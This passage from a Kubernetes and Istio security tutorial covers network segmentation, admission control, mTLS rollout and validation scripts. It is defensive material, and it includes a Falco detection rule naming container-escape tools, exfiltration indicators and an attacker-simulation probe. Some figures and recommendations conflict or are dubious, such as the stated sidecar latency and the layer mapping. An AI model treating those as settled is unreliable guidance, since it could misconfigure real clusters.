- **Privileged**: No restrictions (used for system components)

**Pod Security Admission Controller**:
```yaml
# Namespace annotation: Enforce restricted Pod Security Standard
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted     # Fail non-compliant pods
    pod-security.kubernetes.io/audit: restricted       # Log violations
    pod-security.kubernetes.io/warn: restricted        # Warn on violations
```

**Network Segmentation in Kubernetes**

**Segmentation Models**:

1. **Namespace-level Segmentation**:
   ```yaml
   # Each namespace is independent security boundary
   # NetworkPolicies enforce within namespace
   # RBAC limits cross-namespace access
   ```

2. **Pod-level Segmentation**:
   ```yaml
   # NetworkPolicies between specific pods/labels
   # Fine-grained even within namespace
   ```

3. **Multi-Cluster Segmentation**:
   ```
   Cluster A (prod)
       ↓ [Authorized inter-cluster tunnel]
   Cluster B (backup)
   
   Cross-cluster authentication via service accounts
   Cross-cluster network policies via federation
   ```

**Zero-Trust Segmentation Pattern**:
```yaml
# Step 1: Default-deny all traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
spec:
  podSelector: {}
  policyTypes:
  - Ingress
---
# Step 2: Default-deny all egress (very restrictive)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
---
# Step 3: Allow only explicit traffic paths
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
spec:
  podSelector:
    matchLabels:
      app: api
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web
    ports:
    - protocol: TCP
      port: 8080
```

**Runtime Security in Kubernetes**

**eBPF-based Threat Detection**:
Runtime agents (Falco, Tetragon, Kubearmor) deploy eBPF probes to kernel to detect:

1. **Container Escape Attempts**:
   - Syscalls that indicate namespace breaking (unshare, setns)
   - Attempts to mount host filesystem
   - Privileged operations from non-privileged container

2. **Lateral Movement**:
   - Unexpected outbound connections from workloads
   - Port scanning activity
   - SSH connections from container

3. **Supply Chain Attacks**:
   - Execution of unexpected binaries (not in baseline image)
   - Modification of system files
   - Loading of unsigned kernel modules

4. **Data Exfiltration**:
   - Large outbound data transfers
   - Connections to known C2 (command and control) servers
   - SSH key material being rsync'd externally

#### Architecture Role

Advanced Kubernetes security addresses **cluster-wide policy enforcement and runtime threat detection**. This layer operates at:
- **Policy level**: Admission webhooks, OPA/Kyverno policies, service mesh mTLS
- **Network level**: Zero-trust microsegmentation, service mesh encryption
- **Runtime level**: eBPF-based threat detection, behavioral analysis

**Threat Model Coverage**:
```
External threats (network perimeter): ✓ Covered by ingress/egress policies
Unauthorized user access: ✓ Covered by RBAC + Pod Security Standards
Compromised workload lateral movement: ✓ Covered by network policies + service mesh
Malicious container image: ✓ Covered by admission controllers + image scanning
Zero-day container exploit: ✓ Covered by runtime threat detection
```

#### Production Usage Patterns

**Pattern 1: Layered Admission Control**

```yaml
# Layer 1: Pod Security Standards (built-in)
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
---
# Layer 2: OPA/Kyverno policies (custom business logic)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-approved-registries
spec:
  validationFailureAction: enforce
  rules:
  - name: check-registry
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Only approved registries allowed"
      pattern:
        spec:
          containers:
          - image: "registry.example.com/*" | "gcr.io/approved/*" | "ecr.aws/approved/*"
---
# Layer 3: Image signature verification (webhook)
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: image-signature-verification
webhooks:
- name: verify-image-signature.example.com
  clientConfig:
    service:
      name: sigstore-webhook
      namespace: sigstore
      path: "/verify"
    caBundle: <cert>
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  failurePolicy: Fail
```

**Pattern 2: Service Mesh Security with Istio**

```yaml
# 1. Enable mTLS cluster-wide
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT  # Require mTLS for all workloads
---
# 2. Authorization policy: Only specific pods can communicate
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-processor-auth
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-processor
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/api"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/process-payment"]
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/webhook"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/webhook/payment-status"]
---
# 3. Deny unspecified traffic
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  {}  # Empty spec = deny all
```

**Pattern 3: Comprehensive Network Segmentation**

```yaml
# Production namespace with zero-trust segmentation
apiVersion: v1
kind: Namespace
metadata:
  name: production
---
# Default-deny all traffic (zero-trust)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# Explicit allow: ingress-controller → web tier
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-ingresscontroller-to-web
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: web
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-controller
    ports:
    - protocol: TCP
      port: 8080
---
# Explicit allow: web → API → database chain
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: api
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: web
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 5432
```

#### DevOps Best Practices

**1. OPA/Kyverno Policy as Code**

```bash
#!/bin/bash
# Policy versioning and deployment

# policies/
#   ├── require-resource-limits.yaml
#   ├── require-non-root.yaml
#   ├── require-image-scanning.yaml
#   └── require-labels.yaml

# Apply policies (GitOps-driven)
for policy in policies/*.yaml; do
    kubectl apply -f "$policy"
done

# Verify policies active
kubectl get clusterpolicies -o wide
```

**2. Runtime Threat Detection**

```yaml
# Falco rule for detecting container escape attempt
- rule: Detect Container Escape Attempt
  desc: Detect syscalls indicative of container escape
  condition: >
    spawned_process and
    container and
    (proc.name in (unshare, nsenter, setns) or 
     open_write_on_host_filesystem)
  output: >
    Potential container escape detected
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [container_escape, privilege_escalation]
```

**3. Supply Chain Security Verification**

```bash
#!/bin/bash
# Verify image signature before deployment

IMAGE="${1:-registry.example.com/myapp:1.0}"

# Verify image is signed
cosign verify \
  --key cosign.pub \
  "$IMAGE"

if [ $? -ne 0 ]; then
    echo "❌ Image signature invalid or missing"
    exit 1
fi

echo "✓ Image signature verified, safe to deploy"
kubectl apply -f deployment.yaml
```

#### Common Pitfalls

**Pitfall 1: OPA Policy Complexity → Management Nightmare**

```rego
# ❌ Bad: Complex, hard-to-maintain Rego policy
deny[msg] {
    # 50 lines of rego logic...
    # Hard to debug, easy to create logic errors
}
```

**Fix**: Use Kyverno for simpler policy needs; OPA for complex policy logic.

**Pitfall 2: Service Mesh Overhead Not Considered**

```yaml
# ❌ Bad: Enabling service mesh without load testing
# Istio adds ~50ms latency per request (proxy overhead)
# May breaq SLOs for latency-sensitive workloads
```

**Fix**: Load test with/without service mesh; measure actual impact.

**Pitfall 3: Network Policy Not Tested**

```bash
# ❌ Bad: Deploy network policy without verification
kubectl apply -f network-policy.yaml
# One hour later: Production pod connectivity broken

# ✓ Good: Test in dev/staging first
kubectl apply -f network-policy.yaml -n dev
# Verify all pods still communicate expectedily
# Promote to prod after testing
```

**Pitfall 4: Runtime Threat Detection Ignored**

```bash
# ❌ Bad: Deploy Falco/Tetragon without tuning
# Rules fire constantly (false positives)
# Security team ignores alerts
# Real threats go undetected

# ✓ Good: Tune detection rules to environment
# Run audit mode first (log without blocking)
# Baseline normal behavior
# Enable enforcement gradually
```

**Pitfall 5: Admission Webhook Failures Break Cluster**

```yaml
# ❌ Bad: failurePolicy: Fail
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: custom-validator
webhooks:
- name: validator.example.com
  failurePolicy: Fail  # If webhook times out, request blocked
# If webhook service crashes → All pod deployments fail

# ✓ Good: failurePolicy: Ignore + monitoring
webhooks:
- name: validator.example.com
  failurePolicy: Ignore  # If webhook times out, request allowed
  # But send alert to ops
  # Service team must fix webhook to prevent bypass
```

---

## Service Mesh Security

### Textual Deep Dive

#### Internal Working Mechanism

**Service Mesh Architecture**

A service mesh is a dedicated infrastructure layer for managing service-to-service communication:

```
Traditional Architecture (Direct Pod-to-Pod):
┌─────────────────────────────────────────────────┐
│ Pod A                                           │
│  Application Code                               │
│  ├─ Opens connection to Pod B (IP:port)        │
│  ├─ Sends plaintext data                        │
│  └─ No encryption, no authentication            │
└─────────────────────────────────────────────────┘
                    ↓ (plaintext)
        Pod-to-Pod network (Kubernetes CNI)
                    ↓ (plaintext)
┌─────────────────────────────────────────────────┐
│ Pod B                                           │
│  Application Code                               │
│  ├─ Receives connection from Pod A              │
│  ├─ Reads plaintext data                        │
│  └─ No authentication of caller                 │
└─────────────────────────────────────────────────┘

Issues:
- Traffic in plaintext (eavesdropping possible)
- No mutual authentication (Pod A doesn't verify Pod B identity)
- No traffic policies (all pods can contact all others)
```

**Service Mesh Architecture (Istio Example)**:

```
┌────────────────────────────────────────────────────────┐
│ Pod A                                                  │
│  Application Code                                      │
│  ├─ Opens connection to service://Pod B               │
│  └─ (localhost:15000)                                 │
│                                                        │
│  Sidecar Proxy (Envoy)                                │
│  ├─ Intercepts connection                             │
│  ├─ Encrypts traffic (mTLS)                           │
│  ├─ Verifies Pod B identity                           │
│  ├─ Enforces authorization policies                   │
│  ├─ Metrics/logging collection                        │
│  └─ Automatic retry/circuit breaking                  │
└────────────────────────────────────────────────────────┘
                ↓ (encrypted mTLS tunnel)
        Service Mesh Data Plane (Envoy sidecars)
                ↓ (encrypted)
┌────────────────────────────────────────────────────────┐
│ Pod B                                                  │
│  Sidecar Proxy (Envoy)                                │
│  ├─ Receives encrypted connection                     │
│  ├─ Decrypts traffic                                  │
│  ├─ Verifies Pod A identity/authorization             │
│  └─ Routes to application                             │
│                                                        │
│  Application Code                                      │
│  ├─ Receives plaintext data from sidecar              │
│  └─ Processes request                                 │
└────────────────────────────────────────────────────────┘

Behind the scenes:
┌────────────────────────────────────────────────────────┐
│ Control Plane (istiod)                                │
│  ├─ Watches Kubernetes API                            │
│  ├─ Generates Envoy configuration (VirtualServices)   │
│  ├─ Manages mTLS certificates                         │
│  ├─ Enforces policies (AuthorizationPolicy)           │
│  └─ Collects telemetry from sidecars                  │
└────────────────────────────────────────────────────────┘
        ↑ Configuration push to all sidecars
```

**mTLS (Mutual Transport Layer Security)**

**Certificate Management**:
```
Istio Control Plane maintains certificate hierarchy:

1. Root CA (self-signed, long-lived, ~10 years)
   ├─ Generates intermediate CAs per namespace
   │
   ├─ Intermediate CA (namespace-scoped, monthly rotation)
   │  ├─ Generates workload certificates per pod
   │  │
   │  └─ Workload Certificate (pod-specific, daily rotation)
   │     ├─ Common Name: spiffe://cluster.local/ns/production/sa/payment-processor
   │     ├─ Alternative Names: pod name, service name
   │     └─ Validity: 24 hours
   │
   └─ All certificates managed transparently by istiod
      No manual key distribution, automatic rotation

Trust Model:
Pod A wants to connect to Pod B:

1. Pod A sidecar: "I need to talk to Pod B (service://pod-b)"
2. Control plane: "This is Pod B's certificate" (returns cert chain)
3. Pod A sidecar: Establishes TLS handshake with Pod B sidecar
4. Pod B sidecar: Present certificate (signed by same Root CA as Pod A)
5. Pod A sidecar: Verify Pod B certificate against Root CA
6. Mutual authentication complete → Encrypted channel established
```

**Identity-Based Access Control**

```
Traditional RBAC: "User can GET /api/pods"
Service Mesh: "Only pods with service account 'frontend' can call backend service"

Authorization Policy Model:

1. Source identity: Service account of calling pod
   Example: cluster.local/ns/production/sa/web-frontend

2. Destination: Target service/pod
   Example: Service "payment-processor"

3. Action: HTTP methods, paths, ports
   Example: POST /process-payment on port 8080

Policy Evaluation:
┌─────────────────────┐
│ Request arrives     │
│ From: frontend-pod  │
│ To: payment service │
│ Method: POST        │
└─────────────────────┘
         ↓
┌──────────────────────────────────────┐
│ Service Mesh checks AuthorizationPolicy:
│ "Only frontend service account can POST to payment"
└──────────────────────────────────────┘
         ↓
   ✓ ALLOWED or ✗ DENIED
   (Connection terminated if denied)
```

**Sidecar Proxy Interception**

```
How does sidecar intercept Pod A's outbound traffic?

Mechanism 1: TCP iptables rules (old approach)
- Pod's iptables redirects port 80/443 to sidecar (15000/15001)
- Application unaware of interception
- Works transparently

Mechanism 2: eBPF-based redirection (modern, Cilium/Tetragon)
- Kernel intercepts traffic at eBPF hook
- Less overhead than iptables
- Cleaner separation

Mechanism 3: Istio CNI Plugin
- Istio's own network plugin handles redirection
- Most control, best performance
- Requires separate installation

Result:
┌────────────────────────────────┐
│ Application Container          │
│  curl http://service:8080      │
│  (destination: 10.0.0.50:8080) │
└────────────────────────────────┘
          ↓ (iptables redirect)
┌────────────────────────────────┐
│ Sidecar Proxy                  │
│  Listening: localhost:15000    │
│  (intercepts all traffic)      │
└────────────────────────────────┘
          ↓ (encryption, auth)
┌────────────────────────────────┐
│ Destination Pod                │
│  Sidecar receives request      │
│  (decrypts, verifies)          │
└────────────────────────────────┘
```

**Traffic Policy Features**

Service mesh enforces policies at sidecar level:

```
1. Retry Logic
   upstream fails → Retry with exponential backoff
   Default: 3 retries, configurable per service

2. Circuit Breaking
   Failure rate > threshold → Stop sending traffic (circuit open)
   Prevents cascading failures

3. Load Balancing
   Round-robin, least requests, consistent hash (per caller)
   Configurable per destination

4. Timeout Enforcement
   Request takes > 30s → Terminate (configurable)
   Prevents hang-ups

5. Rate Limiting
   Caller exceeds X requests/sec → Throttle
   Prevents resource exhaustion

Example (Istio VirtualService):
spec:
  hosts:
  - payment-processor
  http:
  - match:
    - uri:
        prefix: "/v1/"
    route:
    - destination:
        host: payment-processor
        port:
          number: 8080
    timeout: 30s
    retries:
      attempts: 3
      perTryTimeout: 10s
    outlierDetection:
      consecutive5xxErrors: 5
      interval: 30s
      baseEjectionTime: 30s
```

#### Architecture Role

Service mesh operates at the **application network layer** (L7), providing:

```
Layer Model:
L4 (Transport): TCP/IP (handled by Kubernetes CNI, NetworkPolicy)
L5 (Session): mTLS encryption, identity verification
L6 (Application): HTTP routing, retry logic, circuit breaking, rate limiting
L7 (Application): Protocol-specific (HTTP headers, gRPC, etc.)

Service mesh = L5-L7 orchestration
```

**Responsibilities**:

| Role | Responsibility |
|------|-----------------|
| **Platform Team** | Istio installation, certificate authority, control plane management, policy templates |
| **Application Team** | Define VirtualServices (routing), DestinationRules (traffic policies), AuthorizationPolicies |
| **Security Team** | Design authorization policies, monitor service-to-service traffic, enforce zero-trust |
| **DevOps Operator** | Monitor control plane health, manage certificate rotations, troubleshoot traffic issues |

#### Production Usage Patterns

**Pattern 1: Gradual mTLS Rollout**

```
Phase 1 (Week 1): Permissive mode
- mTLS enabled, but non-mTLS traffic still accepted
- Gives teams time to deploy sidecars

Phase 2 (Week 2): Enforcement
- Only mTLS traffic accepted
- All pods must have sidecar proxies

Phase 3 (Week 3): Authorization policies
- Beyond encryption, enforce "who can call whom"

Kubernetes manifest:
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: PERMISSIVE  # Week 1
    # mode: STRICT    # Week 2+
```

**Pattern 2: Authorization Policy Hierarchy**

```
Default: DENY ALL
Then explicitly ALLOW specific traffic

apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-web-to-api
  namespace: production
spec:
  selector:
    matchLabels:
      app: api-service
  rules:
  - from:
    - source:
        principals:
        - cluster.local/ns/production/sa/web-frontend
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/v1/*"]
---
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  {}  # Empty spec = deny all traffic not explicitly allowed
```

**Pattern 3: Zero-Trust with Service Mesh**

```
Combine multiple security layers:

1. Network Policy (L3/L4): Pod A → Pod B on port 8080 ALLOWED
2. Service Mesh (L5): Only if Pod A's service account is in whitelist
3. Application (L7): Only if request has valid JWT token

Result:
- Network level: Wrong IP → Denied
- Mesh level: Wrong certificate → Denied
- Application level: Wrong token → Denied

Attack Vector Analysis:
Attacker in Pod C (malicious) tries to reach Pod B:

Network Policy: ✓ Blocks Pod C → Pod B on port 8080
  (Denied at CNI level)

Even if attacker somehow bypasses:
Mesh mTLS: ✓ Pod C's certificate doesn't match Pod A's
  (Denied at sidecar level)

Even if attacker steals Pod A's certificate:
Application JWT: ✓ Attacker doesn't have valid JWT
  (Denied at application level)

Result: Very high confidence that only legitimate Pod A can reach Pod B
```

**Pattern 4: Observability Through Service Mesh**

```
Service mesh sidecars see all traffic, enable observability:

Metrics collected:
- Request latency (p50/p95/p99)
- Error rates by destination
- Traffic volume by source/destination/method
- mTLS usage metrics (% of traffic encrypted)

These are exported to Prometheus/standard metrics endpoints
Tools like Grafana visualize this data

Debugging advantage:
kubectl describe pod → Shows sidecar version
istioctl analyze → Detects policy misconfiguration
istioctl proxy-config cluster -n prod-ns → Shows actual Envoy config
```

#### DevOps Best Practices

**1. Staged mTLS Rollout**

```bash
#!/bin/bash
# Never enable mTLS cluster-wide at once

# Step 1: Permissive mode (mTLS works, but non-mTLS accepted)
kubectl apply -f - <<'EOF'
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: payment-ns
spec:
  mtls:
    mode: PERMISSIVE
EOF

# Step 2: Monitor for 1 week
# Collect metrics: Are sidecars able to communicate?
kubectl logs -n istio-system deployment/istiod | grep -i error

# Step 3: If successful, enable strict mTLS
kubectl patch peerauthentication default \
  -n payment-ns \
  -p '{"spec":{"mtls":{"mode":"STRICT"}}}'

# Step 4: Verify no service disruption
kubectl get events -n payment-ns | grep -i "connection\|refused"
```

**2. Authorization Policy Testing**

```bash
#!/bin/bash
# Test authorization policies before enforcing

# Create test pod (attacker simulation)
kubectl run attacker --image=alpine -n production

# Try to reach protected service
kubectl exec attacker -n production -- \
  wget -O- http://payment-processor:8080/health

# Expected: Connection refused (policy blocked)
# Actual: [If connection succeeds, policy not enforced properly]

# Debug: Check if policy actually applied
kubectl get authorizationpolicy -n production -o yaml
```

**3. Monitoring Sidecar Injection**

```yaml
# Annotate namespaces for automatic sidecar injection
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    istio-injection: enabled  # Enables auto-injection

# Verify injection:
kubectl get pods -n production -o jsonpath='{.items[0].spec.containers[*].name}'
# Output should include: payment-processor container-name
#                        istio-proxy (the sidecar)
```

**4. Certificate Rotation Verification**

```bash
#!/bin/bash
# Verify mTLS certificates are being rotated

# Check certificate validity in sidecar
kubectl exec -n production payment-processor-pod \
  -c istio-proxy -- openssl s_client -connect payment-processor:8080 \
  -showcerts 2>/dev/null | grep -A 2 "Issuer:\|Subject:"

# Expected: Certificate issued by Istio CA
# Expiry: Within 24 hours (automatic rotation)

# Monitor expiry in Prometheus
kubectl exec -n prometheus prometheus-pod -- \
  curl http://localhost:9090/api/v1/query?query='istio_cert_expiry_seconds_total'

# Alert if < 1 hour remaining (should not happen with auto-rotation)
```

**5. Performance Monitoring**

```bash
#!/bin/bash
# Service mesh adds latency (sidecar proxy overhead)

# Measure: How much latency does mTLS add?

# Baseline (without sidecar):
# Request latency: 50ms

# With sidecar (mTLS):
# Request latency: 50ms + 5-15ms (proxy overhead)

# Acceptable overhead: < 10ms (most applications won't notice)
# Problematic overhead: > 50ms (check if sidecar misconfigured)

# Monitor in Prometheus/Grafana:
histogram_quantile(0.95, rate(istio_request_duration_milliseconds_bucket[5m]))
# Should be: baseline ± 10ms
```

#### Common Pitfalls

**Pitfall 1: Sidecar Injection Not Enabled**

```yaml
# ❌ Bad: Namespace doesn't have injection label
apiVersion: v1
kind: Namespace
metadata:
  name: production
  # Missing: istio-injection: enabled

# Result: Pods deployed without sidecars
# mTLS not enabled, no traffic policies

# ✓ Good: Enable annotation
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    istio-injection: enabled
```

**Pitfall 2: Authorization Policies Too Permissive**

```yaml
# ❌ Bad: Allow all traffic from all sources
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-all
  namespace: production
spec:
  rules:
  - from:
    - source:
        principals: ["*"]
    to:
    - operation:
        methods: ["*"]

# This defeats the purpose of service mesh (no security)

# ✓ Good: Explicit whitelist
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-api-policy
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-api
  rules:
  - from:
    - source:
        principals:
        - cluster.local/ns/production/sa/web-frontend
    to:
    - operation:
        methods: ["POST"]
        paths: ["/api/payment/process"]
```

**Pitfall 3: mTLS Breaking Legacy Workloads**

```yaml
# ❌ Bad: Enable STRICT mTLS without checking compatibility
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: STRICT  # All traffic must be mTLS

# Problem: If legacy service doesn't have sidecar, it can't connect
# Result: Service outage

# ✓ Good: Permissive first, then migrate
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: PERMISSIVE  # Both mTLS and non-mTLS accepted

# After weeks of permissive mode:
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: STRICT  # Now enforce
```

**Pitfall 4: Control Plane Misconfiguration Cascades**

```bash
# ❌ Bad: Typo in VirtualService destination
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: payment-route
spec:
  hosts:
  - payment-service
  http:
  - route:
    - destination:
        host: paymet-processor  # Typo: "paymet" instead of "payment"
        port:
          number: 8080

# Result: All traffic to payment-service routed to non-existent host
# All requests fail (503 service unavailable)

# ✓ Good: Validate before applying
istioctl analyze  # Detects typos and misconfigurations
```

**Pitfall 5: Sidecar Resource Exhaustion**

```yaml
# ❌ Bad: No resource limits on sidecars
apiVersion: v1
kind: Pod
metadata:
  name: payment-processor
spec:
  containers:
  - name: app
    resources:
      requests:
        memory: 512Mi
      limits:
        memory: 1Gi
  - name: istio-proxy
    # No resources specified
    # Can consume unlimited CPU/memory

# If proxy gets memory leak → Entire pod crashes

# ✓ Good: Set limits on sidecar
apiVersion: v1
kind: Pod
metadata:
  name: payment-processor
spec:
  containers:
  - name: istio-proxy
    resources:
      requests:
        cpu: 100m
        memory: 128Mi
      limits:
        cpu: 500m
        memory: 256Mi
```

---

### Practical Code Examples

**Example 1: Complete Istio Setup with mTLS and Authorization**

```yaml
# 1. Install Istio (using helm)
helm repo add istio https://istio-release.storage.googleapis.com/charts
helm install istio-base istio/base -n istio-system --create-namespace
helm install istiod istio/istiod -n istio-system

# 2. Enable sidecar injection on namespace
kubectl label namespace production istio-injection=enabled

# 3. Deploy application with sidecar
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-processor
  namespace: production
spec:
  template:
    metadata:
      labels:
        app: payment-processor
        version: v1
    spec:
      serviceAccountName: payment-processor
      containers:
      - name: app
        image: payment-processor:1.0.0
        ports:
        - containerPort: 8080

# 4. Create service for routing
apiVersion: v1
kind: Service
metadata:
  name: payment-processor
  namespace: production
spec:
  ports:
  - port: 8080
    name: http
  selector:
    app: payment-processor

# 5. Create VirtualService for traffic policy
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: payment-processor-route
  namespace: production
spec:
  hosts:
  - payment-processor
  http:
  - match:
    - uri:
        prefix: "/api/v1/"
    route:
    - destination:
        host: payment-processor
        port:
          number: 8080
    timeout: 30s
    retries:
      attempts: 3
      perTryTimeout: 10s

# 6. Enable mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: payment-processor-mtls
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-processor
  mtls:
    mode: STRICT  # Only mTLS traffic allowed

# 7. Add authorization policy (only API gateway can call)
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-api-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-processor
  action: ALLOW
  rules:
  - from:
    - source:
        principals:
        - cluster.local/ns/production/sa/api-gateway
    to:
    - operation:
        methods: ["POST", "GET"]
        paths:
        - "/api/v1/process"
        - "/api/v1/status"
```

**Example 2: Bash Script for Validating Service Mesh Security**

```bash
#!/bin/bash
# Validate service mesh security configuration

set -e

NAMESPACE=${1:-production}

echo "=== Service Mesh Security Validation ==="

# 1. Check PeerAuthentication (mTLS)
echo ""
echo "1. Checking mTLS configuration..."
MTLS_MODE=$(kubectl get peerauthentication -n $NAMESPACE -o jsonpath='{.items[0].spec.mtls.mode}')
if [ "$MTLS_MODE" != "STRICT" ]; then
  echo "❌ WARNING: mTLS mode is $MTLS_MODE (should be STRICT)"
else
  echo "✓ mTLS STRICT mode enabled"
fi

# 2. Check sidecar injection
echo ""
echo "2. Checking sidecar injection..."
INJECTION_LABEL=$(kubectl get namespace $NAMESPACE -o jsonpath='{.metadata.labels.istio-injection}')
if [ "$INJECTION_LABEL" != "enabled" ]; then
  echo "❌ WARNING: Sidecar injection not enabled on namespace $NAMESPACE"
else
  echo "✓ Sidecar injection enabled"
fi

# Verify pods have sidecars
PODS_WITH_SIDECARS=$(kubectl get pods -n $NAMESPACE -o jsonpath='{.items[*].spec.containers[*].name}' | grep -c istio-proxy || echo 0)
TOTAL_PODS=$(kubectl get pods -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}' | wc -w)
echo "  Pods with sidecars: $PODS_WITH_SIDECARS/$TOTAL_PODS"

# 3. Check authorization policies
echo ""
echo "3. Checking authorization policies..."
AUTHZ_POLICIES=$(kubectl get authorizationpolicies -n $NAMESPACE --no-headers | wc -l)
if [ "$AUTHZ_POLICIES" -eq 0 ]; then
  echo "❌ WARNING: No authorization policies found (implicit allow)"
else
  echo "✓ Authorization policies configured: $AUTHZ_POLICIES"
fi

# 4. Check for default-deny policy
echo ""
echo "4. Checking for default-deny authorization policy..."
DEFAULT_DENY=$(kubectl get authorizationpolicies -n $NAMESPACE -o jsonpath='{.items[?(@.spec.rules==null)].metadata.name}' | wc -w)
if [ "$DEFAULT_DENY" -eq 0 ]; then
  echo "❌ WARNING: No default-deny authorization policy (implicit allow)"
else
  echo "✓ Default-deny policy in place"
fi

# 5. Check VirtualServices
echo ""
echo "5. Checking VirtualServices for traffic policies..."
VIRTUAL_SERVICES=$(kubectl get virtualservices -n $NAMESPACE --no-headers | wc -l)
echo "  VirtualServices configured: $VIRTUAL_SERVICES"

# 6. Verify certificate validity
echo ""
echo "6. Checking certificate expiry in sidecars..."
PODS=$(kubectl get pods -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}')
for POD in $PODS; do
  CERT_EXPIRY=$(kubectl exec -n $NAMESPACE $POD -c istio-proxy -- \
    openssl s_client -connect localhost:8080 -showcerts 2>/dev/null | \
    grep "notAfter=" | head -1)
  echo "  Pod $POD: $CERT_EXPIRY"
done

# 7. Check control plane health
echo ""
echo "7. Checking Istio control plane health..."
ISTIOD_READY=$(kubectl get pods -n istio-system -l app=istiod -o jsonpath='{.items[0].status.conditions[?(@.type=="Ready")].status}')
if [ "$ISTIOD_READY" == "True" ]; then
  echo "✓ istiod control plane healthy"
else
  echo "❌ ERROR: istiod control plane not healthy"
fi

echo ""
echo "=== Validation Complete ==="
```

**Example 3: Troubleshooting Service Mesh Connectivity**

```bash
#!/bin/bash
# Debug why service-to-service communication is failing

POD_NAME=${1:-payment-processor-abc123}
NAMESPACE=${2:-production}
TARGET_SERVICE=${3:-order-processor}

echo "=== Service Mesh Connectivity Troubleshooting ==="

# 1. Check if pod has sidecar
echo ""
echo "1. Checking sidecar status..."
SIDECARS=$(kubectl get pod $POD_NAME -n $NAMESPACE -o jsonpath='{.spec.containers[*].name}' | grep -c istio-proxy)
if [ "$SIDECARS" -eq 0 ]; then
  echo "❌ ERROR: No istio-proxy sidecar found"
  echo "  Solution: Enable sidecar injection on namespace"
  exit 1
fi
echo "✓ Sidecar present"

# 2. Check sidecar logs for errors
echo ""
echo "2. Checking sidecar proxy logs..."
kubectl logs $POD_NAME -n $NAMESPACE -c istio-proxy --tail=50 | grep -i "error\|refused\|denied" || echo "✓ No obvious errors"

# 3. Check mTLS certificate
echo ""
echo "3. Checking mTLS certificate validity..."
kubectl exec -n $NAMESPACE $POD_NAME -c istio-proxy -- \
  openssl s_client -connect $TARGET_SERVICE:8080 -showcerts \
   2>/dev/null | openssl x509 -noout -dates

# 4. Check authorization policy
echo ""
echo "4. Checking authorization policies affecting this pod..."
kubectl get authorizationpolicies -n $NAMESPACE -o yaml | grep -A 10 "selector:"

# 5. Test connectivity from pod
echo ""
echo "5. Testing connectivity to target service..."
kubectl exec -n $NAMESPACE $POD_NAME -- curl -v http://$TARGET_SERVICE:8080/health 2>&1 | head -20

# 6. Check Envoy configuration
echo ""
echo "6. Checking Envoy sidecar configuration..."
kubectl exec -n $NAMESPACE $POD_NAME -c istio-proxy -- \
